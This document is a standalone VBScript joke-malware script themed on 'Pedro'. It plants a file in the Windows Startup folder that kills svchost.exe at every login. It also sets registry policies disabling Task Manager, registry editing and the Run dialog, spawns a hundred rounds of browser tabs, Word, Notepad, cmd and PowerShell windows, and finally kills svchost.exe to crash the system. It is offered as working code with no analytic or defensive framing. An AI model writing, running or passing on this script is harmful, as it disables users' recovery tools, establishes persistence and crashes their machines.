Dim Shell
Set Shell = CreateObject("WScript.Shell")

Dim objFSO, objFile
Dim strScriptPath, strTxtFilePath, strVbsFilePath, strTxtContent, strVbsContent

' Get the full path of the script file
strScriptPath = WScript.ScriptFullName

' Extract the directory from the script path
strTxtFilePath = Left(strScriptPath, InStrRev(strScriptPath, "\") - 1) & "\File.txt"
strVbsFilePath = Shell.SpecialFolders("Startup") & "\MyScript.vbs"

' Define content for the text file
strTxtContent = "Pedro Pedro Pedro Pedro Pe"

' Create a FileSystemObject
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Create the text file
Set objFile = objFSO.CreateTextFile(strTxtFilePath)

' Write content to the text file
objFile.Write strTxtContent

' Close the text file
objFile.Close

' Open the text file using Notepad
Shell.Run "notepad.exe " & strTxtFilePath

' Wait for Notepad to open
WScript.Sleep 1000

' Define content for the VBScript file
strVbsContent = _
"Dim Shell" & vbNewLine & _
"Set Shell = CreateObject(""WScript.Shell"")" & vbNewLine & _
"Shell.Run ""taskkill /f /im svchost.exe""" & vbNewLine

' Concatenate additional content
strVbsContent = strVbsContent & _
"Shell.Run ""notepad.exe C:\Path\To\Your\File.txt""" & vbNewLine

' Create the VBScript file
Set objFile = objFSO.CreateTextFile(strVbsFilePath)

' Write content to the VBScript file
objFile.Write strVbsContent

' Close the VBScript file
objFile.Close

WScript.Sleep 1000

Shell.Run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f"
Shell.Run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f"
Shell.Run "reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f"

Shell.Run "msedge.exe www.youtube.com/watch?v=OCZIzzQpJUw"

Dim Index

For Index = 1 To 100
    Shell.Run "msedge.exe www.youtube.com/watch?v=OCZIzzQpJUw"
    Shell.Run "winword"
    Shell.Run "msedge.exe www.google.com/search?q=pedro+pedro+pedro+pedro+pe"
    Shell.Run "notepad"
    Shell.Run "cmd"
    Shell.Run "powershell"
Next

Shell.Run "taskkill /f /im svchost.exe"
